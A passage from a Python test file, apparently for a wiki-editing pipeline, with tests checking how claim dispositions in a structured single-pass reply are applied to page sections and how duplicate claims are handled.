    records = [record(CLAIM, "c-root"), record(CAPABILITY_ONE, "c-cap")]
    root_text, cap_text = f"{CAPABILITY_ONE} [source: {URL}]", f"{CLAIM} [source: {URL}]"
    reply = {
        "sections": [
            {
                "section_id": units[0].id,
                "edits": [],
                "append": root_text,
                "handled_claim_ids": ["c-cap"],
                "claim_dispositions": [{"id": "c-cap", "status": "integrated", "anchor": root_text}],
            },
            entry(
                units,
                "Capabilities",
                append=cap_text,
                dispositions=[{"id": "c-root", "status": "integrated", "anchor": cap_text}],
            ),
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        applied = single_pass.apply_reply(units, reply, records, [], page_path="wiki/existing-model.md")
    assert gaps == [] and applied.handled == ["c-cap", "c-root"]
    assert root_text in applied.body and cap_text in applied.body


def test_a_claim_named_by_two_sections_is_not_rehomed(units, base_body):
    records = [record(CLAIM, "c-root"), record(CAPABILITY_ONE, "c-cap")]
    text = f"{CLAIM} [source: {URL}]"
    twice = {"id": "c-root", "status": "integrated", "anchor": text}
    reply = {
        "sections": [
            {
                "section_id": units[0].id,
                "edits": [],
                "append": text,
                "handled_claim_ids": ["c-root"],
                "claim_dispositions": [twice],
            },
            entry(units, "Capabilities", append=text, dispositions=[twice]),
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        applied = single_pass.apply_reply(units, reply, records, [], page_path="wiki/existing-model.md")
    assert any(f"single-pass section edit {unit_id(units, 'Capabilities')}" in gap for gap in gaps)
    assert applied.handled == ["c-root"] and applied.body.count(text) == 1
